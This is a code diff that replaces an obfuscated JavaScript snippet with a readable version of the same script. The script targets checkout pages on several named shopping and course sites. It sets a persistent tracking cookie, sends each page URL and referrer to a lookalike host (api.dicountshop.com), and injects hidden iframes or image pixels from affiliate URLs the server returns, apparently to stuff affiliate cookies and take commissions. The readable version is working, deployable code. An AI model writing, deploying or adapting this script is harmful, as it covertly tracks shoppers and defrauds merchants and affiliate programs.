@@ -1,1 +1,118 @@
-function _0x2ad0(_0x1a6a66,_0x52b10d){_0x1a6a66=_0x1a6a66-0x15f;const _0x4073f6=_0x4073();let _0x2ad078=_0x4073f6[_0x1a6a66];return _0x2ad078;}function _0x4073(){const _0x4379f6=['json','appendChild','createElement','internationalopenacademy.com','toString','readyState','56fHdNTE','find','tracking_uuid=','body','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','interactive','3740160cEiDTM','referrer','now','iframe','/xpay','12555488rflykZ','split','affiliate_url','none','application/json',';path=/;SameSite=Lax','some','error','/checkout/shipping','https://api.dicountshop.com/api/track-user','confirmation','getTime','paths','/checkout/payment','hostname','location','/pay-installments','4266845CtttIT','src','/checkout/delivery','substring','trim','tracking_uuid','185505VrRcZg','complete','503342wxrQdz','DOMContentLoaded','toLowerCase','4QOPvnF','6ShjFMR','style','type','7757298bOUjHh','random','/checkout/confirmation','88lAWMBl','toUTCString','30890NeqUsh','replace','Tracking\x20Failed:','cookie','cart','POST','/checkout/review-order','success','length','https://api.dicountshop.com/api/fallback-pixel?id='];_0x4073=function(){return _0x4379f6;};return _0x4073();}(function(_0x393534,_0x554880){const _0x4a2ff7=_0x2ad0,_0x651476=_0x393534();while(!![]){try{const _0x1dfc13=-parseInt(_0x4a2ff7(0x18f))/0x1*(parseInt(_0x4a2ff7(0x15f))/0x2)+-parseInt(_0x4a2ff7(0x181))/0x3*(parseInt(_0x4a2ff7(0x186))/0x4)+parseInt(_0x4a2ff7(0x17b))/0x5*(parseInt(_0x4a2ff7(0x187))/0x6)+parseInt(_0x4a2ff7(0x183))/0x7*(parseInt(_0x4a2ff7(0x18d))/0x8)+-parseInt(_0x4a2ff7(0x18a))/0x9+-parseInt(_0x4a2ff7(0x165))/0xa+parseInt(_0x4a2ff7(0x16a))/0xb;if(_0x1dfc13===_0x554880)break;else _0x651476['push'](_0x651476['shift']());}catch(_0x218ba6){_0x651476['push'](_0x651476['shift']());}}}(_0x4073,0x981ca),(function(){const _0x38450a=_0x2ad0,_0x54527a=_0x38450a(0x173),_0x558be8=_0x38450a(0x198),_0x2d79fd=[{'type':_0x38450a(0x193),'paths':['/checkout/cart']},{'type':'shipping','paths':[_0x38450a(0x17d),_0x38450a(0x172)]},{'type':'payment','paths':[_0x38450a(0x169),_0x38450a(0x177),_0x38450a(0x17a)]},{'type':'review-order','paths':[_0x38450a(0x195)]},{'type':_0x38450a(0x174),'paths':[_0x38450a(0x18c)]}],_0x5b3cdd={'www.xcite.com':{'always':![],'cartExtra':!![]},'www.fairprice.com.sg':{'always':!![],'cartExtra':!![]},'internationalopenacademy.com':{'always':!![],'cartExtra':!![]}};function _0x511fd9(){const _0x1b368a=_0x38450a;return _0x1b368a(0x163)[_0x1b368a(0x190)](/[xy]/g,function(_0x253fe8){const _0x26a826=_0x1b368a,_0x29c82f=Math[_0x26a826(0x18b)]()*0x10|0x0,_0x8d2dcf=_0x253fe8==='x'?_0x29c82f:_0x29c82f&0x3|0x8;return _0x8d2dcf[_0x26a826(0x19d)](0x10);});}function _0x354f57(_0xa719f6){const _0x50a1ec=_0x38450a,_0x4ec042=_0xa719f6+'=',_0x4a73ac=document[_0x50a1ec(0x192)][_0x50a1ec(0x16b)](';');for(let _0xd8611e=0x0;_0xd8611e<_0x4a73ac['length'];_0xd8611e++){const _0x2583d3=_0x4a73ac[_0xd8611e][_0x50a1ec(0x17f)]();if(_0x2583d3['indexOf'](_0x4ec042)===0x0)return _0x2583d3[_0x50a1ec(0x17e)](_0x4ec042[_0x50a1ec(0x197)],_0x2583d3['length']);}return'';}function _0x569464(_0xc0364c){const _0x4c5524=_0x38450a;try{if(window[_0x4c5524(0x179)][_0x4c5524(0x178)]===_0x4c5524(0x19c)){const _0x1a2582=document[_0x4c5524(0x19b)](_0x4c5524(0x168));_0x1a2582[_0x4c5524(0x17c)]=_0xc0364c,_0x1a2582[_0x4c5524(0x188)]['display']=_0x4c5524(0x16d),document['body'][_0x4c5524(0x19a)](_0x1a2582);return;}const _0x373887=new Image();_0x373887['src']=_0xc0364c,_0x373887['style']['display']=_0x4c5524(0x16d),document[_0x4c5524(0x162)]['appendChild'](_0x373887);}catch(_0x117d80){}}function _0x1129c6(){const _0x1a0012=_0x38450a,_0x513073=window['location']['pathname'][_0x1a0012(0x185)](),_0x53ce4d=_0x2d79fd[_0x1a0012(0x160)](function(_0x1ef534){const _0x3e2b6b=_0x1a0012;return _0x1ef534[_0x3e2b6b(0x176)][_0x3e2b6b(0x170)](function(_0x549a31){return _0x513073['includes'](_0x549a31);});});return _0x53ce4d?_0x53ce4d[_0x1a0012(0x189)]:null;}async function _0x16fd92(){const _0x3464ae=_0x38450a;try{const _0x37bfd5=_0x354f57(_0x3464ae(0x180))||_0x511fd9(),_0x934f30=new Date(Date[_0x3464ae(0x167)]()+0x1e*0x18*0x3c*0x3c*0x3e8)[_0x3464ae(0x18e)]();document[_0x3464ae(0x192)]=_0x3464ae(0x161)+_0x37bfd5+';\x20expires='+_0x934f30+_0x3464ae(0x16f);const _0x484ce3=await fetch(_0x54527a,{'method':_0x3464ae(0x194),'keepalive':!![],'body':JSON['stringify']({'url':window['location']['href'],'referrer':document[_0x3464ae(0x166)],'unique_id':_0x37bfd5,'origin':window['location'][_0x3464ae(0x178)],'timestamp':new Date()[_0x3464ae(0x175)]()}),'headers':{'Content-Type':_0x3464ae(0x16e)}}),_0xd48861=await _0x484ce3[_0x3464ae(0x199)]();_0xd48861[_0x3464ae(0x196)]&&_0xd48861[_0x3464ae(0x16c)]?_0x569464(_0xd48861[_0x3464ae(0x16c)]):_0x569464(_0x558be8+_0x37bfd5);}catch(_0x309004){console[_0x3464ae(0x171)](_0x3464ae(0x191),_0x309004);}}function _0x21672c(){_0x16fd92();}function _0x129167(){const _0x244b00=_0x38450a,_0xc194d3=window[_0x244b00(0x179)]['hostname'],_0x568184=_0x5b3cdd[_0xc194d3];if(!_0x568184)return;const _0x17184b=_0x1129c6();if(_0x568184['always'])_0x21672c();_0x568184['cartExtra']&&_0x17184b&&(_0x21672c(),_0x21672c());}document[_0x38450a(0x19e)]===_0x38450a(0x164)||document[_0x38450a(0x19e)]===_0x38450a(0x182)?_0x129167():window['addEventListener'](_0x38450a(0x184),_0x129167);}()));
+(function () {
+  const TRACK_URL = 'https://api.dicountshop.com/api/track-user';
+  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/fallback-pixel?id=';
+
+  const CHECKOUT_PATH_TYPES = [
+    { type: 'cart', paths: ['/checkout/cart'] },
+    { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
+    { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
+    { type: 'review-order', paths: ['/checkout/review-order'] },
+    { type: 'confirmation', paths: ['/checkout/confirmation'] },
+  ];
+
+  const SITE_CONFIG = {
+    'www.xcite.com': { always: false, cartExtra: true },
+    'www.fairprice.com.sg': { always: true, cartExtra: true },
+    'internationalopenacademy.com': { always: true, cartExtra: true },
+  };
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = (Math.random() * 16) | 0;
+      const v = c === 'x' ? r : (r & 0x3) | 0x8;
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const prefix = name + '=';
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const c = cookies[i].trim();
+      if (c.indexOf(prefix) === 0) {
+        return c.substring(prefix.length, c.length);
+      }
+    }
+    return '';
+  }
+
+  function injectTrackingPixel(src) {
+    try {
+      if (window.location.hostname === 'internationalopenacademy.com') {
+        const iframe = document.createElement('iframe');
+        iframe.src = src.replace(/^http:\/\//i, 'https://');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        return;
+      }
+      const img = new Image();
+      img.src = src;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+    } catch (err) {}
+  }
+
+  function matchCheckoutPageType() {
+    const pathname = window.location.pathname.toLowerCase();
+    const matched = CHECKOUT_PATH_TYPES.find(function (entry) {
+      return entry.paths.some(function (path) {
+        return pathname.includes(path);
+      });
+    });
+    return matched ? matched.type : null;
+  }
+
+  async function sendTrackingPing() {
+    try {
+      const uniqueId = getCookie('tracking_uuid') || generateUUID();
+      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';
+
+      const response = await fetch(TRACK_URL, {
+        method: 'POST',
+        keepalive: true,
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+      const data = await response.json();
+
+      if (data.success && data.affiliate_url) {
+        injectTrackingPixel(data.affiliate_url);
+      } else {
+        injectTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function triggerTracking() {
+    sendTrackingPing();
+  }
+
+  function main() {
+    const hostname = window.location.hostname;
+    const config = SITE_CONFIG[hostname];
+    if (!config) return;
+
+    const checkoutType = matchCheckoutPageType();
+
+    if (config.always) triggerTracking();
+    if (config.cartExtra && checkoutType) {
+      triggerTracking();
+      triggerTracking();
+    }
+  }
+
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    main();
+  } else {
+    window.addEventListener('DOMContentLoaded', main);
+  }
+})();
